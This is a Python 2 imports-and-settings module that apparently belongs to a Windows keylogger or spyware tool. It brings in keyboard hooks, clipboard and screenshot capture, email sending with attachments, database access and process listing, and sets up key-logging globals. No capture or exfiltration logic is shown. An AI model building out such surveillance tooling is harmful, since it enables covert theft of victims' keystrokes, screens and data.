"""
    This module included all the imported libraries and settings of the program
    Create on : Dec 28, 2016
"""

from ctypes import *
from threading import Thread
from PIL import ImageGrab
from email.MIMEMultipart import MIMEMultipart # for attachment
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.mime.image import MIMEImage
from email import Encoders

import pythoncom, pyHook  # 
import win32api, win32file,win32gui
import win32clipboard     # retrieve information from the windows clipboard
import os ,glob           # for working with operating systems
import time, datetime
import ctypes
import smtplib            # for sending emails
import urllib, re
import subprocess
import sqlite3            # to access the database
import io
import psutil             # retrive the running process on host machine #cross-platform
import threading   # 

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = ""
logging_output = ""
logging_date = datetime.datetime.now()
logging_status = False
logging_key_thread = 0
timer = 0

get_windows = ctypes.windll.user32.EnumWindows
get_windows_proc =  ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
get_window_text = ctypes.windll.user32.GetWindowTextW
get_window_text_length = ctypes.windll.user32.GetWindowTextLengthW
is_window_visible = ctypes.windll.user32.IsWindowVisible
